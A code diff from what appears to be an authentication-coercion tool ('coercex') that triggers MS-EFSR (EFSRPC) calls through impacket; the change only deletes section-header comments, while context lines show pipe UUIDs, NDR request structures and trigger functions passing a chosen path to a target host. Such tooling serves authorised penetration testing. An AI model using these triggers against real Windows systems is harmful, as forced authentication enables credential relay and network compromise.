@@ -11,7 +11,6 @@ from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
 
 from coercex.methods.base import CoercionMethod, PipeBinding
 
-# ── Interface UUIDs ──────────────────────────────────────────────────────────
 EFSR_UUID_1 = "df1941c5-fe89-4e79-bf10-463657acf44d"  # \PIPE\efsrpc
 EFSR_UUID_2 = "c681d488-d850-11d0-8c52-00c04fd90f7e"  # \PIPE\lsarpc etc.
 
@@ -32,9 +31,6 @@ EFSR_PATH_STYLES = [
 
 PROTOCOL_SHORT = "MS-EFSR"
 PROTOCOL_LONG = "[MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol"
-
-
-# ── NDR Structures ───────────────────────────────────────────────────────────
 
 
 class _EfsRpcOpenFileRaw(NDRCALL):
@@ -114,9 +110,6 @@ class _EfsRpcAddUsersToFileEx(NDRCALL):
     )
 
 
-# ── Trigger Functions ────────────────────────────────────────────────────────
-
-
 def _trigger_open_file_raw(dce, path, target):
     request = _EfsRpcOpenFileRaw()
     request["FileName"] = path
@@ -186,9 +179,6 @@ def _trigger_add_users_to_file_ex(dce, path, target):
     request["Reserved"] = 0
     request["FileName"] = path
     dce.request(request)
-
-
-# ── Method Definitions ───────────────────────────────────────────────────────
 
 
 def get_methods() -> list[CoercionMethod]:
